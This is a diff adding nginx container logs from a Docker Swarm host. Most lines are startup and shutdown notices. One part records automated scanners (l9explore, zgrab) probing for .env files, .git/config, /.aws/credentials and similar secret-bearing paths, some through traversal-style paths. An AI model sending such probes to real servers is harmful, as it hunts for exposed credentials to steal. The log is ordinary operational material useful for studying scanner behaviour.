@@ -1,0 +1,233 @@
+2026-04-08T23:55:38.987174309Z vcs_nginx.0.k4mht0x6szuj@vcs-vm-us1    | 2026/04/08 23:55:38 [notice] 1#1: using the "epoll" event method
+2026-04-08T23:55:38.988364379Z vcs_nginx.0.k4mht0x6szuj@vcs-vm-us1    | 2026/04/08 23:55:38 [notice] 1#1: nginx/1.27.5
+2026-04-08T23:55:38.988378809Z vcs_nginx.0.k4mht0x6szuj@vcs-vm-us1    | 2026/04/08 23:55:38 [notice] 1#1: built by gcc 14.2.0 (Alpine 14.2.0) 
+2026-04-08T23:55:38.988383429Z vcs_nginx.0.k4mht0x6szuj@vcs-vm-us1    | 2026/04/08 23:55:38 [notice] 1#1: OS: Linux 6.8.0-1048-gcp
+2026-04-08T23:55:38.988387279Z vcs_nginx.0.k4mht0x6szuj@vcs-vm-us1    | 2026/04/08 23:55:38 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1024:524288
+2026-04-08T23:55:38.989629009Z vcs_nginx.0.k4mht0x6szuj@vcs-vm-us1    | 2026/04/08 23:55:38 [notice] 1#1: start worker processes
+2026-04-08T23:55:38.989764609Z vcs_nginx.0.k4mht0x6szuj@vcs-vm-us1    | 2026/04/08 23:55:38 [notice] 1#1: start worker process 7
+2026-04-08T23:55:38.991157428Z vcs_nginx.0.k4mht0x6szuj@vcs-vm-us1    | 2026/04/08 23:55:38 [notice] 1#1: start worker process 8
+2026-04-08T23:08:40.199137080Z vcs_nginx.0.ws9unb3dg9ds@vcs-vm-us1    | 2026/04/08 23:08:40 [notice] 1#1: using the "epoll" event method
+2026-04-08T23:08:40.199180310Z vcs_nginx.0.ws9unb3dg9ds@vcs-vm-us1    | 2026/04/08 23:08:40 [notice] 1#1: nginx/1.27.5
+2026-04-08T23:08:40.199185890Z vcs_nginx.0.ws9unb3dg9ds@vcs-vm-us1    | 2026/04/08 23:08:40 [notice] 1#1: built by gcc 14.2.0 (Alpine 14.2.0) 
+2026-04-08T23:08:40.199190310Z vcs_nginx.0.ws9unb3dg9ds@vcs-vm-us1    | 2026/04/08 23:08:40 [notice] 1#1: OS: Linux 6.8.0-1048-gcp
+2026-04-08T23:08:40.199193770Z vcs_nginx.0.ws9unb3dg9ds@vcs-vm-us1    | 2026/04/08 23:08:40 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1024:524288
+2026-04-08T23:08:40.201799160Z vcs_nginx.0.ws9unb3dg9ds@vcs-vm-us1    | 2026/04/08 23:08:40 [notice] 1#1: start worker processes
+2026-04-08T23:08:40.202450870Z vcs_nginx.0.ws9unb3dg9ds@vcs-vm-us1    | 2026/04/08 23:08:40 [notice] 1#1: start worker process 7
+2026-04-08T23:08:40.202465400Z vcs_nginx.0.ws9unb3dg9ds@vcs-vm-us1    | 2026/04/08 23:08:40 [notice] 1#1: start worker process 8
+2026-04-08T23:09:33.592947390Z vcs_nginx.0.ws9unb3dg9ds@vcs-vm-us1    | 2026/04/08 23:09:33 [notice] 1#1: signal 3 (SIGQUIT) received, shutting down
+2026-04-08T23:09:33.593007470Z vcs_nginx.0.ws9unb3dg9ds@vcs-vm-us1    | 2026/04/08 23:09:33 [notice] 8#8: gracefully shutting down
+2026-04-08T23:09:33.593014660Z vcs_nginx.0.ws9unb3dg9ds@vcs-vm-us1    | 2026/04/08 23:09:33 [notice] 7#7: gracefully shutting down
+2026-04-08T23:09:33.593020410Z vcs_nginx.0.ws9unb3dg9ds@vcs-vm-us1    | 2026/04/08 23:09:33 [notice] 8#8: exiting
+2026-04-08T23:09:33.593025730Z vcs_nginx.0.ws9unb3dg9ds@vcs-vm-us1    | 2026/04/08 23:09:33 [notice] 7#7: exiting
+2026-04-08T23:09:33.593030950Z vcs_nginx.0.ws9unb3dg9ds@vcs-vm-us1    | 2026/04/08 23:09:33 [notice] 8#8: exit
+2026-04-08T23:09:33.594556380Z vcs_nginx.0.ws9unb3dg9ds@vcs-vm-us1    | 2026/04/08 23:09:33 [notice] 7#7: exit
+2026-04-08T23:09:33.600312320Z vcs_nginx.0.ws9unb3dg9ds@vcs-vm-us1    | 2026/04/08 23:09:33 [notice] 1#1: signal 17 (SIGCHLD) received from 8
+2026-04-08T23:09:33.600364910Z vcs_nginx.0.ws9unb3dg9ds@vcs-vm-us1    | 2026/04/08 23:09:33 [notice] 1#1: worker process 8 exited with code 0
+2026-04-08T23:09:33.600373160Z vcs_nginx.0.ws9unb3dg9ds@vcs-vm-us1    | 2026/04/08 23:09:33 [notice] 1#1: signal 29 (SIGIO) received
+2026-04-08T23:09:33.601585300Z vcs_nginx.0.ws9unb3dg9ds@vcs-vm-us1    | 2026/04/08 23:09:33 [notice] 1#1: signal 17 (SIGCHLD) received from 7
+2026-04-08T23:09:33.601963530Z vcs_nginx.0.ws9unb3dg9ds@vcs-vm-us1    | 2026/04/08 23:09:33 [notice] 1#1: worker process 7 exited with code 0
+2026-04-08T23:09:33.602457640Z vcs_nginx.0.ws9unb3dg9ds@vcs-vm-us1    | 2026/04/08 23:09:33 [notice] 1#1: exit
+2026-04-08T23:53:58.922272716Z vcs_nginx.0.kpjc8dm6r3n4@vcs-vm-us1    | 2026/04/08 23:53:58 [notice] 1#1: using the "epoll" event method
+2026-04-08T23:53:58.922445536Z vcs_nginx.0.kpjc8dm6r3n4@vcs-vm-us1    | 2026/04/08 23:53:58 [notice] 1#1: nginx/1.27.5
+2026-04-08T23:53:58.922454656Z vcs_nginx.0.kpjc8dm6r3n4@vcs-vm-us1    | 2026/04/08 23:53:58 [notice] 1#1: built by gcc 14.2.0 (Alpine 14.2.0) 
+2026-04-08T23:53:58.922458845Z vcs_nginx.0.kpjc8dm6r3n4@vcs-vm-us1    | 2026/04/08 23:53:58 [notice] 1#1: OS: Linux 6.8.0-1048-gcp
+2026-04-08T23:53:58.922462765Z vcs_nginx.0.kpjc8dm6r3n4@vcs-vm-us1    | 2026/04/08 23:53:58 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1024:524288
+2026-04-08T23:53:58.924463556Z vcs_nginx.0.kpjc8dm6r3n4@vcs-vm-us1    | 2026/04/08 23:53:58 [notice] 1#1: start worker processes
+2026-04-08T23:53:58.924784226Z vcs_nginx.0.kpjc8dm6r3n4@vcs-vm-us1    | 2026/04/08 23:53:58 [notice] 1#1: start worker process 8
+2026-04-08T23:53:58.925201205Z vcs_nginx.0.kpjc8dm6r3n4@vcs-vm-us1    | 2026/04/08 23:53:58 [notice] 1#1: start worker process 9
+2026-04-08T23:55:37.997174673Z vcs_nginx.0.kpjc8dm6r3n4@vcs-vm-us1    | 2026/04/08 23:55:37 [notice] 1#1: signal 3 (SIGQUIT) received, shutting down
+2026-04-08T23:55:37.998788163Z vcs_nginx.0.kpjc8dm6r3n4@vcs-vm-us1    | 2026/04/08 23:55:37 [notice] 8#8: gracefully shutting down
+2026-04-08T23:55:37.998808193Z vcs_nginx.0.kpjc8dm6r3n4@vcs-vm-us1    | 2026/04/08 23:55:37 [notice] 9#9: gracefully shutting down
+2026-04-08T23:55:37.998814303Z vcs_nginx.0.kpjc8dm6r3n4@vcs-vm-us1    | 2026/04/08 23:55:37 [notice] 8#8: exiting
+2026-04-08T23:55:37.998819933Z vcs_nginx.0.kpjc8dm6r3n4@vcs-vm-us1    | 2026/04/08 23:55:37 [notice] 9#9: exiting
+2026-04-08T23:55:37.998825403Z vcs_nginx.0.kpjc8dm6r3n4@vcs-vm-us1    | 2026/04/08 23:55:37 [notice] 8#8: exit
+2026-04-08T23:55:37.998831303Z vcs_nginx.0.kpjc8dm6r3n4@vcs-vm-us1    | 2026/04/08 23:55:37 [notice] 9#9: exit
+2026-04-08T23:55:38.005696512Z vcs_nginx.0.kpjc8dm6r3n4@vcs-vm-us1    | 2026/04/08 23:55:38 [notice] 1#1: signal 17 (SIGCHLD) received from 8
+2026-04-08T23:55:38.005749032Z vcs_nginx.0.kpjc8dm6r3n4@vcs-vm-us1    | 2026/04/08 23:55:38 [notice] 1#1: worker process 8 exited with code 0
+2026-04-08T23:55:38.005756532Z vcs_nginx.0.kpjc8dm6r3n4@vcs-vm-us1    | 2026/04/08 23:55:38 [notice] 1#1: signal 29 (SIGIO) received
+2026-04-08T23:55:38.007500722Z vcs_nginx.0.kpjc8dm6r3n4@vcs-vm-us1    | 2026/04/08 23:55:38 [notice] 1#1: signal 17 (SIGCHLD) received from 9
+2026-04-08T23:55:38.007516222Z vcs_nginx.0.kpjc8dm6r3n4@vcs-vm-us1    | 2026/04/08 23:55:38 [notice] 1#1: worker process 9 exited with code 0
+2026-04-08T23:55:38.007653322Z vcs_nginx.0.kpjc8dm6r3n4@vcs-vm-us1    | 2026/04/08 23:55:38 [notice] 1#1: exit
+2026-04-08T20:14:15.582108438Z vcs_nginx.0.s7j5s7z0j3rr@vcs-vm-us1    | 2026/04/08 20:14:15 [notice] 1#1: using the "epoll" event method
+2026-04-08T20:14:15.582148938Z vcs_nginx.0.s7j5s7z0j3rr@vcs-vm-us1    | 2026/04/08 20:14:15 [notice] 1#1: nginx/1.27.5
+2026-04-08T20:14:15.582154169Z vcs_nginx.0.s7j5s7z0j3rr@vcs-vm-us1    | 2026/04/08 20:14:15 [notice] 1#1: built by gcc 14.2.0 (Alpine 14.2.0) 
+2026-04-08T20:14:15.582158078Z vcs_nginx.0.s7j5s7z0j3rr@vcs-vm-us1    | 2026/04/08 20:14:15 [notice] 1#1: OS: Linux 6.8.0-1048-gcp
+2026-04-08T20:14:15.582161558Z vcs_nginx.0.s7j5s7z0j3rr@vcs-vm-us1    | 2026/04/08 20:14:15 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1024:524288
+2026-04-08T20:14:15.584448038Z vcs_nginx.0.s7j5s7z0j3rr@vcs-vm-us1    | 2026/04/08 20:14:15 [notice] 1#1: start worker processes
+2026-04-08T20:14:15.586381068Z vcs_nginx.0.s7j5s7z0j3rr@vcs-vm-us1    | 2026/04/08 20:14:15 [notice] 1#1: start worker process 7
+2026-04-08T20:14:15.586397248Z vcs_nginx.0.s7j5s7z0j3rr@vcs-vm-us1    | 2026/04/08 20:14:15 [notice] 1#1: start worker process 8
+2026-04-08T20:18:19.711079905Z vcs_nginx.0.s7j5s7z0j3rr@vcs-vm-us1    | 10.0.0.2 - - [08/Apr/2026:20:18:19 +0000] "GET /.env HTTP/1.1" 200 423 "-" "Mozilla/5.0 (Linux; Android 5.1.1; 5065N Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.95 Mobile Safari/537.36" "-"
+2026-04-08T20:18:19.816787377Z vcs_nginx.0.s7j5s7z0j3rr@vcs-vm-us1    | 10.0.0.2 - - [08/Apr/2026:20:18:19 +0000] "\x16\x03\x01\x02\x00\x01\x00\x01\xFC\x03\x03\xF2/,wt\xD9N.O\x0B@\x04\xC2\xA4\xDF^\x80\xF68\xE5\x02\xAD?\x8E\xF2\xCA\xB8\x16\x07\x97\xA2) \x88\xC4\xA8,P3 W\x92W\xC1~d\x82\x84\xC2\x22\x95X\x80\xBC\xC5\x8DQ\xC3\x86\x18\xE2\xD0\x88\xB1\xE0\x00F\x13\x02\x13\x03\x13\x01\x13\x04\xC0,\xC00\xCC\xA9\xCC\xA8\xC0\xAD\xC0+\xC0/\xC0\xAC\xC0#\xC0'\xC0" 400 157 "-" "-" "-"
+2026-04-08T20:18:19.951990968Z vcs_nginx.0.s7j5s7z0j3rr@vcs-vm-us1    | 10.0.0.2 - - [08/Apr/2026:20:18:19 +0000] "GET /sendgrid.env HTTP/1.1" 200 423 "-" "Mozilla/5.0 (X11; NetBSD amd64; rv:16.0) Gecko/20121102 Firefox/16.0" "-"
+2026-04-08T20:18:20.145842414Z vcs_nginx.0.s7j5s7z0j3rr@vcs-vm-us1    | 10.0.0.2 - - [08/Apr/2026:20:18:20 +0000] "GET /web/.env HTTP/1.1" 200 423 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:54.0) Gecko/20100101 Firefox/54.0" "-"
+2026-04-08T23:09:34.516129392Z vcs_nginx.0.or25x4imhgxv@vcs-vm-us1    | 2026/04/08 23:09:34 [notice] 1#1: using the "epoll" event method
+2026-04-08T23:09:34.516173932Z vcs_nginx.0.or25x4imhgxv@vcs-vm-us1    | 2026/04/08 23:09:34 [notice] 1#1: nginx/1.27.5
+2026-04-08T23:09:34.516179242Z vcs_nginx.0.or25x4imhgxv@vcs-vm-us1    | 2026/04/08 23:09:34 [notice] 1#1: built by gcc 14.2.0 (Alpine 14.2.0) 
+2026-04-08T23:09:34.516182922Z vcs_nginx.0.or25x4imhgxv@vcs-vm-us1    | 2026/04/08 23:09:34 [notice] 1#1: OS: Linux 6.8.0-1048-gcp
+2026-04-08T23:09:34.516186622Z vcs_nginx.0.or25x4imhgxv@vcs-vm-us1    | 2026/04/08 23:09:34 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1024:524288
+2026-04-08T23:09:34.519072082Z vcs_nginx.0.or25x4imhgxv@vcs-vm-us1    | 2026/04/08 23:09:34 [notice] 1#1: start worker processes
+2026-04-08T23:09:34.519169492Z vcs_nginx.0.or25x4imhgxv@vcs-vm-us1    | 2026/04/08 23:09:34 [notice] 1#1: start worker process 8
+2026-04-08T23:09:34.519178122Z vcs_nginx.0.or25x4imhgxv@vcs-vm-us1    | 2026/04/08 23:09:34 [notice] 1#1: start worker process 9
+2026-04-08T23:10:29.224520969Z vcs_nginx.0.or25x4imhgxv@vcs-vm-us1    | 10.0.0.2 - - [08/Apr/2026:23:10:29 +0000] "\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\xF8\x16\xA8${:\x85\x8F\xFB\x8E\x03\xA0Tt\xE2!\x12\xB9\xF5\xABC\xD9\xACI\x17\x0C\xD7\xD0\xF8\x8F\xA9\x8B \xD2Ga2\x9D\xA7\xAF\x06\x89\x81\x1D[I\x14\xCCi\xC8\x17\xBF\xD4\x1A\x97\x80\xD2\x8D\xA8\xE4\x88\x19\x82J\xA9\x00&\xC0+\xC0/\xC0,\xC00\xCC\xA9\xCC\xA8\xC0\x09\xC0\x13\xC0" 400 157 "-" "-" "-"
+2026-04-08T23:10:29.409457155Z vcs_nginx.0.or25x4imhgxv@vcs-vm-us1    | 10.0.0.2 - - [08/Apr/2026:23:10:29 +0000] "GET / HTTP/1.1" 400 157 "-" "-" "-"
+2026-04-08T23:10:29.499003418Z vcs_nginx.0.or25x4imhgxv@vcs-vm-us1    | 10.0.0.2 - - [08/Apr/2026:23:10:29 +0000] "GET / HTTP/1.1" 200 423 "-" "l9tcpid/v1.1.0" "-"
+2026-04-08T23:11:52.838684286Z vcs_nginx.0.or25x4imhgxv@vcs-vm-us1    | 10.0.0.2 - - [08/Apr/2026:23:11:52 +0000] "GET /admin/.git/config HTTP/1.1" 200 423 "-" "l9explore/1.2.2" "-"
+2026-04-08T23:11:54.052903716Z vcs_nginx.0.or25x4imhgxv@vcs-vm-us1    | 10.0.0.2 - - [08/Apr/2026:23:11:54 +0000] "GET /.env.dev.local HTTP/1.1" 200 423 "-" "l9explore/1.2.2" "-"
+2026-04-08T23:11:56.204123895Z vcs_nginx.0.or25x4imhgxv@vcs-vm-us1    | 10.0.0.2 - - [08/Apr/2026:23:11:56 +0000] "GET /.env.staging.local HTTP/1.1" 200 423 "-" "l9explore/1.2.2" "-"
+2026-04-08T23:11:57.579412752Z vcs_nginx.0.or25x4imhgxv@vcs-vm-us1    | 10.0.0.2 - - [08/Apr/2026:23:11:57 +0000] "GET /.env.template HTTP/1.1" 200 423 "-" "l9explore/1.2.2" "-"
+2026-04-08T23:11:59.814086007Z vcs_nginx.0.or25x4imhgxv@vcs-vm-us1    | 10.0.0.2 - - [08/Apr/2026:23:11:59 +0000] "GET /data/.git/config HTTP/1.1" 200 423 "-" "l9explore/1.2.2" "-"
+2026-04-08T23:12:01.691774807Z vcs_nginx.0.or25x4imhgxv@vcs-vm-us1    | 10.0.0.2 - - [08/Apr/2026:23:12:01 +0000] "GET /docker-compose.prod.yml HTTP/1.1" 200 423 "-" "l9explore/1.2.2" "-"
+2026-04-08T23:12:03.378370852Z vcs_nginx.0.or25x4imhgxv@vcs-vm-us1    | 10.0.0.2 - - [08/Apr/2026:23:12:03 +0000] "GET /.env.stage HTTP/1.1" 200 423 "-" "l9explore/1.2.2" "-"
+2026-04-08T23:12:04.127561666Z vcs_nginx.0.or25x4imhgxv@vcs-vm-us1    | 10.0.0.2 - - [08/Apr/2026:23:12:04 +0000] "GET /.env.test HTTP/1.1" 200 423 "-" "l9explore/1.2.2" "-"
+2026-04-08T23:12:05.539920170Z vcs_nginx.0.or25x4imhgxv@vcs-vm-us1    | 10.0.0.2 - - [08/Apr/2026:23:12:05 +0000] "GET /settings/.env HTTP/1.1" 200 423 "-" "l9explore/1.2.2" "-"
+2026-04-08T23:12:06.533464966Z vcs_nginx.0.or25x4imhgxv@vcs-vm-us1    | 10.0.0.2 - - [08/Apr/2026:23:12:06 +0000] "GET /core/.git/config HTTP/1.1" 200 423 "-" "l9explore/1.2.2" "-"
+2026-04-08T23:12:07.885719116Z vcs_nginx.0.or25x4imhgxv@vcs-vm-us1    | 10.0.0.2 - - [08/Apr/2026:23:12:07 +0000] "GET /static../.git/config HTTP/1.1" 200 423 "-" "l9explore/1.2.2" "-"
+2026-04-08T23:12:08.579580664Z vcs_nginx.0.or25x4imhgxv@vcs-vm-us1    | 10.0.0.2 - - [08/Apr/2026:23:12:08 +0000] "GET /.env HTTP/1.1" 200 423 "-" "l9explore/1.2.2" "-"
+2026-04-08T23:12:10.740159283Z vcs_nginx.0.or25x4imhgxv@vcs-vm-us1    | 10.0.0.2 - - [08/Apr/2026:23:12:10 +0000] "GET /.env.config HTTP/1.1" 200 423 "-" "l9explore/1.2.2" "-"
+2026-04-08T23:12:11.511385035Z vcs_nginx.0.or25x4imhgxv@vcs-vm-us1    | 10.0.0.2 - - [08/Apr/2026:23:12:11 +0000] "GET /.env.default HTTP/1.1" 200 423 "-" "l9explore/1.2.2" "-"
+2026-04-08T23:12:12.546150118Z vcs_nginx.0.or25x4imhgxv@vcs-vm-us1    | 10.0.0.2 - - [08/Apr/2026:23:12:12 +0000] "GET /.env.production.local HTTP/1.1" 200 423 "-" "l9explore/1.2.2" "-"
+2026-04-08T23:12:12.893672543Z vcs_nginx.0.or25x4imhgxv@vcs-vm-us1    | 10.0.0.2 - - [08/Apr/2026:23:12:12 +0000] "GET /.env_sample HTTP/1.1" 200 423 "-" "l9explore/1.2.2" "-"
+2026-04-08T23:12:13.404356015Z vcs_nginx.0.or25x4imhgxv@vcs-vm-us1    | 10.0.0.2 - - [08/Apr/2026:23:12:13 +0000] "GET /app/.git/config HTTP/1.1" 200 423 "-" "l9explore/1.2.2" "-"
+2026-04-08T23:12:14.551864289Z vcs_nginx.0.or25x4imhgxv@vcs-vm-us1    | 10.0.0.2 - - [08/Apr/2026:23:12:14 +0000] "GET /project/.git/config HTTP/1.1" 200 423 "-" "l9explore/1.2.2" "-"
+2026-04-08T23:12:15.723543933Z vcs_nginx.0.or25x4imhgxv@vcs-vm-us1    | 10.0.0.2 - - [08/Apr/2026:23:12:15 +0000] "GET /.env.development.local HTTP/1.1" 200 423 "-" "l9explore/1.2.2" "-"
+2026-04-08T23:12:16.663577113Z vcs_nginx.0.or25x4imhgxv@vcs-vm-us1    | 10.0.0.2 - - [08/Apr/2026:23:12:16 +0000] "GET /.env.prod.local HTTP/1.1" 200 423 "-" "l9explore/1.2.2" "-"
+2026-04-08T23:12:18.795180105Z vcs_nginx.0.or25x4imhgxv@vcs-vm-us1    | 10.0.0.2 - - [08/Apr/2026:23:12:18 +0000] "GET /api/.env HTTP/1.1" 200 423 "-" "l9explore/1.2.2" "-"
+2026-04-08T23:12:19.881552765Z vcs_nginx.0.or25x4imhgxv@vcs-vm-us1    | 10.0.0.2 - - [08/Apr/2026:23:12:19 +0000] "GET /build/.env HTTP/1.1" 200 423 "-" "l9explore/1.2.2" "-"
+2026-04-08T23:12:20.992430982Z vcs_nginx.0.or25x4imhgxv@vcs-vm-us1    | 10.0.0.2 - - [08/Apr/2026:23:12:20 +0000] "GET /.env.production HTTP/1.1" 200 423 "-" "l9explore/1.2.2" "-"
+2026-04-08T23:12:24.112241430Z vcs_nginx.0.or25x4imhgxv@vcs-vm-us1    | 10.0.0.2 - - [08/Apr/2026:23:12:24 +0000] "GET /.env.testing HTTP/1.1" 200 423 "-" "l9explore/1.2.2" "-"
+2026-04-08T23:12:26.494885343Z vcs_nginx.0.or25x4imhgxv@vcs-vm-us1    | 10.0.0.2 - - [08/Apr/2026:23:12:26 +0000] "GET /config/.env HTTP/1.1" 200 423 "-" "l9explore/1.2.2" "-"
+2026-04-08T23:12:28.257312692Z vcs_nginx.0.or25x4imhgxv@vcs-vm-us1    | 10.0.0.2 - - [08/Apr/2026:23:12:28 +0000] "GET /server/.git/config HTTP/1.1" 200 423 "-" "l9explore/1.2.2" "-"
+2026-04-08T23:12:30.053314468Z vcs_nginx.0.or25x4imhgxv@vcs-vm-us1    | 10.0.0.2 - - [08/Apr/2026:23:12:30 +0000] "GET /src/.git/config HTTP/1.1" 200 423 "-" "l9explore/1.2.2" "-"
+2026-04-08T23:12:30.616143677Z vcs_nginx.0.or25x4imhgxv@vcs-vm-us1    | 10.0.0.2 - - [08/Apr/2026:23:12:30 +0000] "GET /media/.git/config HTTP/1.1" 200 423 "-" "l9explore/1.2.2" "-"
+2026-04-08T23:12:32.239075567Z vcs_nginx.0.or25x4imhgxv@vcs-vm-us1    | 10.0.0.2 - - [08/Apr/2026:23:12:32 +0000] "GET /.aws/credentials HTTP/1.1" 200 423 "-" "l9explore/1.2.2" "-"
+2026-04-08T23:12:33.374589682Z vcs_nginx.0.or25x4imhgxv@vcs-vm-us1    | 10.0.0.2 - - [08/Apr/2026:23:12:33 +0000] "GET /.env.dist HTTP/1.1" 200 423 "-" "l9explore/1.2.2" "-"
+2026-04-08T23:12:34.767248639Z vcs_nginx.0.or25x4imhgxv@vcs-vm-us1    | 10.0.0.2 - - [08/Apr/2026:23:12:34 +0000] "GET /.env.live HTTP/1.1" 200 423 "-" "l9explore/1.2.2" "-"
+2026-04-08T23:12:35.612205706Z vcs_nginx.0.or25x4imhgxv@vcs-vm-us1    | 10.0.0.2 - - [08/Apr/2026:23:12:35 +0000] "GET /.env.local HTTP/1.1" 200 423 "-" "l9explore/1.2.2" "-"
+2026-04-08T23:12:36.744065742Z vcs_nginx.0.or25x4imhgxv@vcs-vm-us1    | 10.0.0.2 - - [08/Apr/2026:23:12:36 +0000] "GET /.env.testing.local HTTP/1.1" 200 423 "-" "l9explore/1.2.2" "-"
+2026-04-08T23:12:37.937544223Z vcs_nginx.0.or25x4imhgxv@vcs-vm-us1    | 10.0.0.2 - - [08/Apr/2026:23:12:37 +0000] "GET /backup/.git/config HTTP/1.1" 200 423 "-" "l9explore/1.2.2" "-"
+2026-04-08T23:12:38.185132575Z vcs_nginx.0.or25x4imhgxv@vcs-vm-us1    | 10.0.0.2 - - [08/Apr/2026:23:12:38 +0000] "GET /.env.bak HTTP/1.1" 200 423 "-" "l9explore/1.2.2" "-"
+2026-04-08T23:12:40.390509540Z vcs_nginx.0.or25x4imhgxv@vcs-vm-us1    | 10.0.0.2 - - [08/Apr/2026:23:12:40 +0000] "GET /.env.ci HTTP/1.1" 200 423 "-" "l9explore/1.2.2" "-"
+2026-04-08T23:12:41.748739539Z vcs_nginx.0.or25x4imhgxv@vcs-vm-us1    | 10.0.0.2 - - [08/Apr/2026:23:12:41 +0000] "GET /.env.prod HTTP/1.1" 200 423 "-" "l9explore/1.2.2" "-"
+2026-04-08T23:12:42.317977007Z vcs_nginx.0.or25x4imhgxv@vcs-vm-us1    | 10.0.0.2 - - [08/Apr/2026:23:12:42 +0000] "GET /.env.uat HTTP/1.1" 200 423 "-" "l9explore/1.2.2" "-"
+2026-04-08T23:12:42.983267847Z vcs_nginx.0.or25x4imhgxv@vcs-vm-us1    | 10.0.0.2 - - [08/Apr/2026:23:12:42 +0000] "GET /config/.git/config HTTP/1.1" 200 423 "-" "l9explore/1.2.2" "-"
+2026-04-08T23:12:44.112068213Z vcs_nginx.0.or25x4imhgxv@vcs-vm-us1    | 10.0.0.2 - - [08/Apr/2026:23:12:44 +0000] "GET /dev/.git/config HTTP/1.1" 200 423 "-" "l9explore/1.2.2" "-"
+2026-04-08T23:12:44.343586606Z vcs_nginx.0.or25x4imhgxv@vcs-vm-us1    | 10.0.0.2 - - [08/Apr/2026:23:12:44 +0000] "GET /config.json HTTP/1.1" 200 423 "-" "l9explore/1.2.2" "-"
+2026-04-08T23:12:45.585801514Z vcs_nginx.0.or25x4imhgxv@vcs-vm-us1    | 10.0.0.2 - - [08/Apr/2026:23:12:45 +0000] "GET /.env.backup HTTP/1.1" 200 423 "-" "l9explore/1.2.2" "-"
+2026-04-08T23:12:46.250438245Z vcs_nginx.0.or25x4imhgxv@vcs-vm-us1    | 10.0.0.2 - - [08/Apr/2026:23:12:46 +0000] "GET /.env.qa HTTP/1.1" 200 423 "-" "l9explore/1.2.2" "-"
+2026-04-08T23:12:46.790355134Z vcs_nginx.0.or25x4imhgxv@vcs-vm-us1    | 10.0.0.2 - - [08/Apr/2026:23:12:46 +0000] "GET /.env.save HTTP/1.1" 200 423 "-" "l9explore/1.2.2" "-"
+2026-04-08T23:12:47.716771066Z vcs_nginx.0.or25x4imhgxv@vcs-vm-us1    | 10.0.0.2 - - [08/Apr/2026:23:12:47 +0000] "GET /files/.git/config HTTP/1.1" 200 423 "-" "l9explore/1.2.2" "-"
+2026-04-08T23:12:49.195783646Z vcs_nginx.0.or25x4imhgxv@vcs-vm-us1    | 10.0.0.2 - - [08/Apr/2026:23:12:49 +0000] "GET /public/.git/config HTTP/1.1" 200 423 "-" "l9explore/1.2.2" "-"
+2026-04-08T23:12:50.060201172Z vcs_nginx.0.or25x4imhgxv@vcs-vm-us1    | 10.0.0.2 - - [08/Apr/2026:23:12:50 +0000] "GET /.env.dev HTTP/1.1" 200 423 "-" "l9explore/1.2.2" "-"
+2026-04-08T23:12:51.203165796Z vcs_nginx.0.or25x4imhgxv@vcs-vm-us1    | 10.0.0.2 - - [08/Apr/2026:23:12:51 +0000] "GET /.env.preprod HTTP/1.1" 200 423 "-" "l9explore/1.2.2" "-"
+2026-04-08T23:12:52.221671591Z vcs_nginx.0.or25x4imhgxv@vcs-vm-us1    | 10.0.0.2 - - [08/Apr/2026:23:12:52 +0000] "GET /.env.sandbox HTTP/1.1" 200 423 "-" "l9explore/1.2.2" "-"
+2026-04-08T23:12:54.609518614Z vcs_nginx.0.or25x4imhgxv@vcs-vm-us1    | 10.0.0.2 - - [08/Apr/2026:23:12:54 +0000] "GET /.git/config HTTP/1.1" 200 423 "-" "l9explore/1.2.2" "-"
+2026-04-08T23:12:55.269617565Z vcs_nginx.0.or25x4imhgxv@vcs-vm-us1    | 10.0.0.2 - - [08/Apr/2026:23:12:55 +0000] "GET /cms/.git/config HTTP/1.1" 200 423 "-" "l9explore/1.2.2" "-"
+2026-04-08T23:12:55.467546941Z vcs_nginx.0.or25x4imhgxv@vcs-vm-us1    | 10.0.0.2 - - [08/Apr/2026:23:12:55 +0000] "GET /.envrc HTTP/1.1" 200 423 "-" "l9explore/1.2.2" "-"
+2026-04-08T23:12:56.065559597Z vcs_nginx.0.or25x4imhgxv@vcs-vm-us1    | 10.0.0.2 - - [08/Apr/2026:23:12:56 +0000] "GET /.env.secret HTTP/1.1" 200 423 "-" "l9explore/1.2.2" "-"
+2026-04-08T23:12:56.448655728Z vcs_nginx.0.or25x4imhgxv@vcs-vm-us1    | 10.0.0.2 - - [08/Apr/2026:23:12:56 +0000] "GET /assets../.git/config HTTP/1.1" 200 423 "-" "l9explore/1.2.2" "-"
+2026-04-08T23:12:57.727074733Z vcs_nginx.0.or25x4imhgxv@vcs-vm-us1    | 10.0.0.2 - - [08/Apr/2026:23:12:57 +0000] "GET /media../.git/config HTTP/1.1" 200 423 "-" "l9explore/1.2.2" "-"
+2026-04-08T23:13:00.184886761Z vcs_nginx.0.or25x4imhgxv@vcs-vm-us1    | 10.0.0.2 - - [08/Apr/2026:23:13:00 +0000] "GET /api/.git/config HTTP/1.1" 200 423 "-" "l9explore/1.2.2" "-"
+2026-04-08T23:13:00.799184425Z vcs_nginx.0.or25x4imhgxv@vcs-vm-us1    | 10.0.0.2 - - [08/Apr/2026:23:13:00 +0000] "GET /www/.git/config HTTP/1.1" 200 423 "-" "l9explore/1.2.2" "-"
+2026-04-08T23:13:01.629232573Z vcs_nginx.0.or25x4imhgxv@vcs-vm-us1    | 10.0.0.2 - - [08/Apr/2026:23:13:01 +0000] "GET /configuration/.env HTTP/1.1" 200 423 "-" "l9explore/1.2.2" "-"
+2026-04-08T23:13:02.709918464Z vcs_nginx.0.or25x4imhgxv@vcs-vm-us1    | 10.0.0.2 - - [08/Apr/2026:23:13:02 +0000] "GET /prod/.env HTTP/1.1" 200 423 "-" "l9explore/1.2.2" "-"
+2026-04-08T23:22:06.119260244Z vcs_nginx.0.or25x4imhgxv@vcs-vm-us1    | 10.0.0.2 - - [08/Apr/2026:23:22:06 +0000] "GET /portal/redlion HTTP/1.1" 200 423 "-" "Mozilla/5.0 zgrab/0.x" "-"
+2026-04-08T23:32:21.592285362Z vcs_nginx.0.or25x4imhgxv@vcs-vm-us1    | 10.0.0.2 - - [08/Apr/2026:23:32:21 +0000] "GET / HTTP/1.1" 200 423 "-" "Mozilla/5.0 zgrab/0.x" "-"
